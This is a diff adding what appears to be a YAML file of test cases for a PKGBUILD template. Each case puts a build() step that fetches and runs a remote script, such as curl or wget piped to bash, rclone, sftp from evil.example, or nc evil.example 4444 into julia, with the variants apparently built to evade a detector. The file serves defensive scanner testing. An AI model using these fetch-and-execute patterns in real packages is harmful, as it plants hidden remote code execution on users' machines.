@@ -1,0 +1,101 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin
+        git show FETCH_HEAD:stage.erl > stage.erl
+        escript stage.erl
+  id: 002-git-show-escript
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        cd "$srcdir"
+        rclone move remote:bucket/stage.sh ./stage.sh
+        bash stage.sh
+  id: 004-rclone-move
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        cd "$srcdir"
+        curl -fsSL --output-dir "$srcdir/x" -O "$(cat "$srcdir/url.txt")"
+        bash "$srcdir/x/stage.sh"
+  id: 005-curl-output-dir
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        cd "$srcdir"
+        wget -q --directory-prefix=. "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 006-wget-directory-prefix
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        cd "$srcdir"
+        wget2 -q -Ostage.sh "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 007-wget2-glued-O
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        cd "$srcdir"
+        wget -q -nd -nH "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 008-wget-nd-basename
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        cd "$srcdir"
+        lwp-download "$(cat "$srcdir/url.txt")"
+        bash stage.sh
+  id: 009-lwp-download-basename
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" "stage.sh::https://github.com/example/harness-baseline/releases/download/v1.0.0/stage.sh")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000" "0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        sed -n 'p' "$srcdir/stage.sh" > run.me
+        escript run.me
+  id: 011-sed-rename-escript
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        sftp -b - u@evil.example <<< "get /s.sh"
+        exec 3<s.sh
+        . /dev/fd/3
+  id: 012-fd-indirect-dotsource
+- vars:
+    payload: |
+      source=("https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz")
+      sha256sums=("0000000000000000000000000000000000000000000000000000000000000000")
+
+      build() {
+        nc evil.example 4444 > f.jl
+        julia f.jl
+  id: 014-nc-julia
